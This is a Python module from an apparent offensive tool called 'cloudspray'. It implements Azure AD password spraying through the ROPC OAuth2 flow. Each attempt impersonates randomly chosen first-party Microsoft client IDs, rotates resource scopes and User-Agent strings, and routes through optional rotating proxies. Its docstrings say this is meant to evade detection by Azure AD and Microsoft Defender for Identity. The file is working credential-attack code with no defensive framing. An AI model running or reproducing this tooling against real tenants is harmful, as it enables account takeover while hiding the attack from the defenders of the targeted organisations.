"""ROPC authentication wrapper with anti-fingerprinting rotation.

This module implements the actual network call to Azure AD for each spray
attempt. It uses Microsoft's MSAL (Microsoft Authentication Library) to perform
the Resource Owner Password Credential (ROPC) OAuth2 grant.

**What is ROPC?**
ROPC is an OAuth2 flow where the client sends the user's username and password
directly to the authorization server (Azure AD) in exchange for tokens. Unlike
interactive browser flows, ROPC requires no user interaction -- making it the
standard mechanism for password spraying tools. Azure AD allows ROPC for
"public client" applications (native/mobile apps), which is why we impersonate
well-known first-party Microsoft client IDs.

**Anti-fingerprinting strategy:**
Azure AD and Microsoft Defender for Identity can detect spraying by looking for
a single client ID, endpoint, or User-Agent making many sequential requests.
To counter this, each attempt randomly selects:

- A **client ID** from a pool of legitimate first-party Microsoft application
  IDs (e.g., Office, Teams, Outlook). This makes each request look like it
  comes from a different Microsoft product.
- A **resource endpoint** (e.g., Graph API, Outlook, SharePoint) as the OAuth
  scope target. Varying the resource changes the token audience, adding another
  axis of variation.
- A **User-Agent string** matching real Microsoft application UA patterns.

MSAL ``PublicClientApplication`` instances are cached per client ID to avoid
redundant tenant metadata discovery requests.
"""

import random
from datetime import datetime, timezone

import msal
import requests

from cloudspray.constants import ALL_CLIENT_IDS, ENDPOINTS, USER_AGENTS
from cloudspray.spray.classifier import classify_auth_result
from cloudspray.state.models import SprayAttempt


class Authenticator:
    """Wraps MSAL ROPC flow with client ID, endpoint, and user-agent rotation.

    Each call to :meth:`attempt` picks random values for the client ID,
    resource scope, and User-Agent header, then delegates to MSAL's
    ``acquire_token_by_username_password``. The raw MSAL response (or
    exception) is passed to :func:`classify_auth_result` to determine the
    semantic outcome (valid password, locked, MFA required, etc.).

    The authenticator is stateless across attempts -- all campaign-level
    state (delays, lockout tracking, circuit breaker) lives in
    :class:`SprayEngine`.

    Args:
        domain: Target Azure AD tenant domain (e.g., ``contoso.com``).
            Used to build the authority URL and resolve SharePoint tenant
            slugs for scope URLs.
        proxy_session: Optional ``requests.Session`` pre-configured with
            proxy routing (e.g., from FireProx or an ACI proxy pool). If
            ``None``, a plain session with no proxy is used.
    """

    def __init__(self, domain: str, proxy_session: requests.Session | None = None):
        self._domain = domain
        self._authority = f"https://login.microsoftonline.com/{domain}"
        self._http_client = proxy_session or requests.Session()
        self._client_ids = list(ALL_CLIENT_IDS.values())
        self._endpoints = list(ENDPOINTS.values())
        # Cache MSAL app instances keyed by client_id so we only perform
        # OpenID discovery once per client ID instead of on every attempt.
        self._app_cache: dict[str, msal.PublicClientApplication] = {}

    def attempt(self, username: str, password: str) -> SprayAttempt:
        """Perform a single ROPC authentication attempt against Azure AD.

        Randomly selects a client_id, endpoint scope, and user-agent string
        for each attempt to reduce fingerprinting. The MSAL response is
        classified into an ``AuthResult`` enum value before being returned.

        Args:
            username: Full UPN to authenticate (e.g., ``user@contoso.com``).
            password: Password to test for this user.

        Returns:
            A fully populated ``SprayAttempt`` dataclass containing the
            username, password, randomly chosen parameters, classification
            result, and metadata (timestamp, proxy URL).
        """
        client_id = random.choice(self._client_ids)
        scope_resource = random.choice(self._endpoints)
        user_agent = random.choice(USER_AGENTS)

        # SharePoint endpoints contain a {tenant} placeholder that must be
        # replaced with the first label of the domain (e.g., "contoso" from
        # "contoso.com") to form a valid SharePoint URL.
        tenant_slug = self._domain.split(".")[0]
        scope_resource = scope_resource.replace("{tenant}", tenant_slug)
        # MSAL expects scopes as a list; the /.default suffix requests all
        # permissions the app is configured for on that resource.
        scope = [f"{scope_resource}/.default"]

        # Set the User-Agent before the MSAL call so the underlying HTTP
        # request uses the rotated value.
        self._http_client.headers["User-Agent"] = user_agent

        # Reuse cached MSAL app instances to avoid redundant OpenID Connect
        # discovery round-trips to login.microsoftonline.com.
        if client_id not in self._app_cache:
            self._app_cache[client_id] = msal.PublicClientApplication(
                client_id,
                authority=self._authority,
                http_client=self._http_client,
            )
        app = self._app_cache[client_id]

        auth_result = None
        auth_error = None
        try:
            auth_result = app.acquire_token_by_username_password(
                username, password, scopes=scope
            )
        except Exception as exc:
            auth_error = exc

        # Read proxy URL after the MSAL call so last_proxy_url reflects this
        # attempt. The custom proxy session (e.g., FireProx rotator) exposes
        # which gateway URL was used; fall back to session-level proxy config
        # for static proxy setups.
        proxy_url = ""
        if hasattr(self._http_client, "last_proxy_url"):
            proxy_url = self._http_client.last_proxy_url
        else:
            proxies = self._http_client.proxies or {}
            proxy_url = proxies.get("https", "")

        result_enum, error_code = classify_auth_result(auth_result, auth_error)

        return SprayAttempt(
            username=username,
            password=password,
            client_id=client_id,
            endpoint=scope_resource,
            user_agent=user_agent,
            result=result_enum,
            error_code=error_code,
            timestamp=datetime.now(timezone.utc),
            proxy_used=proxy_url,
        )
